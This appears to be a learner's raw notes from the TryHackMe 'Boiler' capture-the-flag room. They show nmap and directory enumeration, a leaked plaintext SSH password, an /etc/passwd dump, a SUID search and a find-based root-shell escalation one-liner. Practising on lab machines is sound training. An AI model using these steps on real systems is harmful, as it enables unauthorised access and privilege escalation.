@@ -1,0 +1,282 @@
+┌─[mayomacam@parrot]─[~/tryhackme/boiler]
+└──╼ $nmap --min-rate 1000 -Pn -p- 10.10.71.17
+Starting Nmap 7.80 ( https://nmap.org ) at 2020-08-30 07:58 IST
+Warning: 10.10.71.17 giving up on port because retransmission cap hit (10).
+Nmap scan report for 10.10.71.17
+Host is up (0.19s latency).
+Not shown: 65480 closed ports, 51 filtered ports
+PORT      STATE SERVICE
+21/tcp    open  ftp
+80/tcp    open  http
+10000/tcp open  snet-sensor-mgmt
+55007/tcp open  unknown
+
+Nmap done: 1 IP address (1 host up) scanned in 106.89 seconds
+
+
+=====================================================================================================================================================================
+robots.txt
+
+User-agent: *
+Disallow: /
+
+/tmp
+/.ssh
+/yellow
+/not
+/a+rabbit
+/hole
+/or
+/is
+/it
+
+079 084 108 105 077 068 089 050 077 071 078 107 079 084 086 104 090 071 086 104 077 122 073 051 089 122 085 048 077 084 103 121 089 109 070 104 078 084 069 049 079 068 081 07
+
+=====================================================================================================================================================================
+
+21/tcp    open  ftp     vsftpd 3.0.3
+|_ftp-anon: Anonymous FTP login allowed (FTP code 230)
+| ftp-syst: 
+|   STAT: 
+| FTP server status:
+|      Connected to ::ffff:10.8.19.129
+|      Logged in as ftp
+|      TYPE: ASCII
+|      No session bandwidth limit
+|      Session timeout in seconds is 300
+|      Control connection is plain text
+|      Data connections will be plain text
+|      At session startup, client count was 3
+|      vsFTPd 3.0.3 - secure, fast, stable
+|_End of status
+80/tcp    open  http    Apache httpd 2.4.18 ((Ubuntu))
+| http-methods: 
+|_  Supported Methods: GET HEAD POST OPTIONS
+| http-robots.txt: 1 disallowed entry 
+|_/
+|_http-server-header: Apache/2.4.18 (Ubuntu)
+|_http-title: Apache2 Ubuntu Default Page: It works
+10000/tcp open  http    MiniServ 1.930 (Webmin httpd)
+|_http-favicon: Unknown favicon MD5: 76E05677DA9AD3A5479F2F664B5B1867
+| http-methods: 
+|_  Supported Methods: GET HEAD POST OPTIONS
+|_http-title: Site doesn't have a title (text/html; Charset=iso-8859-1).
+55007/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   2048 e3:ab:e1:39:2d:95:eb:13:55:16:d6:ce:8d:f9:11:e5 (RSA)
+|   256 ae:de:f2:bb:b7:8a:00:70:20:74:56:76:25:c0:df:38 (ECDSA)
+|_  256 25:25:83:f2:a7:75:8a:a0:46:b2:12:70:04:68:5c:cb (ED25519)
+
+
+=====================================================================================================================================================================
+
+[08:00:20] 403 -  294B  - /.htusers
+[08:01:25] 200 -   11KB - /index.html
+[08:01:28] 301 -  311B  - /joomla  ->  http://10.10.71.17/joomla/
+[08:01:28] 301 -  325B  - /joomla/administrator  ->  http://10.10.71.17/joomla/administrator/
+[08:01:34] 301 -  311B  - /manual  ->  http://10.10.71.17/manual/
+[08:01:34] 200 -  626B  - /manual/index.html
+[08:01:53] 200 -  257B  - /robots.txt
+[08:01:56] 403 -  299B  - /server-status
+[08:01:56] 403 -  300B  - /server-status/
+
+
+=====================================================================================================================================================================
+
+[08:13:39] 301 -  318B  - /joomla/_files  ->  http://10.10.71.17/joomla/_files/
+[08:13:40] 301 -  317B  - /joomla/_test  ->  http://10.10.71.17/joomla/_test/
+[08:13:57] 301 -  325B  - /joomla/administrator  ->  http://10.10.71.17/joomla/administrator/
+[08:13:57] 403 -  316B  - /joomla/administrator/.htaccess
+[08:13:58] 200 -    5KB - /joomla/administrator/index.php
+[08:13:58] 200 -    5KB - /joomla/administrator/
+[08:13:58] 301 -  330B  - /joomla/administrator/logs  ->  http://10.10.71.17/joomla/administrator/logs/
+[08:14:07] 301 -  315B  - /joomla/bin  ->  http://10.10.71.17/joomla/bin/
+[08:14:07] 200 -   31B  - /joomla/bin/
+[08:14:09] 301 -  317B  - /joomla/build  ->  http://10.10.71.17/joomla/build/
+[08:14:09] 200 -    6KB - /joomla/build.xml
+[08:14:09] 301 -  317B  - /joomla/cache  ->  http://10.10.71.17/joomla/cache/
+[08:14:09] 200 -   31B  - /joomla/cache/
+[08:14:13] 200 -    2KB - /joomla/codeception.yml
+[08:14:14] 301 -  322B  - /joomla/components  ->  http://10.10.71.17/joomla/components/
+[08:14:14] 200 -    2KB - /joomla/composer.json
+[08:14:15] 200 -  117KB - /joomla/composer.lock
+[08:14:15] 200 -    0B  - /joomla/configuration.php
+[08:14:33] 200 -    3KB - /joomla/htaccess.txt
+[08:14:35] 301 -  318B  - /joomla/images  ->  http://10.10.71.17/joomla/images/
+[08:14:36] 301 -  320B  - /joomla/includes  ->  http://10.10.71.17/joomla/includes/
+[08:14:36] 200 -   31B  - /joomla/includes/
+[08:14:37] 303 -    0B  - /joomla/index.php/login/
+[08:14:37] 200 -   12KB - /joomla/index.php
+[08:14:39] 301 -  324B  - /joomla/installation  ->  http://10.10.71.17/joomla/installation/
+[08:14:39] 200 -    6KB - /joomla/installation/
+[08:14:42] 301 -  320B  - /joomla/language  ->  http://10.10.71.17/joomla/language/
+[08:14:43] 301 -  321B  - /joomla/libraries  ->  http://10.10.71.17/joomla/libraries/
+[08:14:43] 200 -   18KB - /joomla/LICENSE.txt
+[08:14:49] 301 -  317B  - /joomla/media  ->  http://10.10.71.17/joomla/media/
+[08:14:52] 301 -  319B  - /joomla/modules  ->  http://10.10.71.17/joomla/modules/
+[08:15:02] 200 -    3KB - /joomla/phpunit.xml.dist
+[08:15:03] 301 -  319B  - /joomla/plugins  ->  http://10.10.71.17/joomla/plugins/
+[08:15:06] 200 -    6KB - /joomla/README.md
+[08:15:06] 200 -    5KB - /joomla/README.txt
+[08:15:20] 301 -  321B  - /joomla/templates  ->  http://10.10.71.17/joomla/templates/
+[08:15:20] 200 -   31B  - /joomla/templates/
+[08:15:20] 301 -  317B  - /joomla/tests  ->  http://10.10.71.17/joomla/tests/
+[08:15:20] 200 -    2KB - /joomla/tests/
+[08:15:21] 301 -  315B  - /joomla/tmp  ->  http://10.10.71.17/joomla/tmp/
+[08:15:21] 200 -   31B  - /joomla/tmp/
+[08:15:26] 200 -    2KB - /joomla/web.config.txt
+
+==================================================================================================================================================================
+
+┌─[mayomacam@parrot]─[~]
+└──╼ $gobuster dir -u http://10.10.71.17/joomla -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -q
+/images (Status: 301)
+/media (Status: 301)
+/templates (Status: 301)
+/modules (Status: 301)
+/tests (Status: 301)
+/bin (Status: 301)
+/plugins (Status: 301)
+/includes (Status: 301)
+/language (Status: 301)
+/components (Status: 301)
+/cache (Status: 301)
+/libraries (Status: 301)
+/installation (Status: 301)
+/build (Status: 301)
+/tmp (Status: 301)
+/layouts (Status: 301)
+/administrator (Status: 301)
+/cli (Status: 301)
+/_files (Status: 301)
+
+
+====================================================================================================================================================================
+view-source:http://10.10.71.17/joomla/_files/
+
+
+<!DOCTYPE html>
+<html>
+	<head>
+		<title>Woops</title>
+	</head>
+	<body>
+		<div align=center><h1 style=color:red>VjJodmNITnBaU0JrWVdsemVRbz0K</h1></div>
+	</body>
+</html>
+
+====================================================================================================================================================================
+
+dirsearch -u http://10.10.71.17/joomla/_test/ -e *
+
+
+[08:47:17] 403 -  307B  - /joomla/_test/.htusers
+[08:48:24] 200 -    5KB - /joomla/_test/index.php
+[08:48:24] 200 -    5KB - /joomla/_test/index.php/login/
+[08:48:30] 200 -  716B  - /joomla/_test/log.txt
+
+====================================================================================================================================================================
+
+http://10.10.71.17/joomla/_test/log.txt
+
+Aug 20 11:16:26 parrot sshd[2443]: Server listening on 0.0.0.0 port 22.
+Aug 20 11:16:26 parrot sshd[2443]: Server listening on :: port 22.
+Aug 20 11:16:35 parrot sshd[2451]: Accepted password for basterd from 10.1.1.1 port 49824 ssh2 #pass: superduperp@$$
+Aug 20 11:16:35 parrot sshd[2451]: pam_unix(sshd:session): session opened for user pentest by (uid=0)
+Aug 20 11:16:36 parrot sshd[2466]: Received disconnect from 10.10.170.50 port 49824:11: disconnected by user
+Aug 20 11:16:36 parrot sshd[2466]: Disconnected from user pentest 10.10.170.50 port 49824
+Aug 20 11:16:36 parrot sshd[2451]: pam_unix(sshd:session): session closed for user pentest
+Aug 20 12:24:38 parrot sshd[2443]: Received signal 15; terminating.
+
+====================================================================================================================================================================
+
+stoner@Vulnerable:~$ sudo -l
+sudo -l
+User stoner may run the following commands on Vulnerable:
+    (root) NOPASSWD: /NotThisTime/MessinWithYa
+stoner@Vulnerable:~$ 
+
+====================================================================================================================================================================
+
+stoner@Vulnerable:~$ id
+id
+uid=1000(stoner) gid=1000(stoner) groups=1000(stoner),4(adm),24(cdrom),30(dip),46(plugdev),110(lxd),115(lpadmin),116(sambashare)
+stoner@Vulnerable:~$ 
+
+====================================================================================================================================================================
+
+cat /etc/passwd
+```
+root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+bin:x:2:2:bin:/bin:/usr/sbin/nologin
+sys:x:3:3:sys:/dev:/usr/sbin/nologin
+sync:x:4:65534:sync:/bin:/bin/sync
+games:x:5:60:games:/usr/games:/usr/sbin/nologin
+man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
+lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
+mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
+news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
+uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
+proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
+www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
+backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
+list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
+irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
+gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
+nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
+systemd-timesync:x:100:102:systemd Time Synchronization,,,:/run/systemd:/bin/false
+systemd-network:x:101:103:systemd Network Management,,,:/run/systemd/netif:/bin/false
+systemd-resolve:x:102:104:systemd Resolver,,,:/run/systemd/resolve:/bin/false
+systemd-bus-proxy:x:103:105:systemd Bus Proxy,,,:/run/systemd:/bin/false
+syslog:x:104:108::/home/syslog:/bin/false
+_apt:x:105:65534::/nonexistent:/bin/false
+lxd:x:106:65534::/var/lib/lxd/:/bin/false
+messagebus:x:107:111::/var/run/dbus:/bin/false
+uuidd:x:108:112::/run/uuidd:/bin/false
+dnsmasq:x:109:65534:dnsmasq,,,:/var/lib/misc:/bin/false
+stoner:x:1000:1000:stoner,,,:/home/stoner:/bin/bash
+mysql:x:110:118:MySQL Server,,,:/nonexistent:/bin/false
+basterd:x:1001:1001::/home/basterd:
+ftp:x:111:119:ftp daemon,,,:/srv/ftp:/bin/false
+sshd:x:112:65534::/var/run/sshd:/usr/sbin/nologin
+```
+
+
+====================================================================================================================================================================
+
+
+
+find / -perm /4000 -type f -exec ls -ld {} \; 2>/dev/null
+
+
+====================================================================================================================================================================
+
+
+/usr/bin/find . -exec /bin/sh -p \; -quit
+
+
+
+
+====================================================================================================================================================================
+
+
+
+
+
+====================================================================================================================================================================
+
+
+
+
+
+
+
+====================================================================================================================================================================
+
+
+
+
+
+
+====================================================================================================================================================================
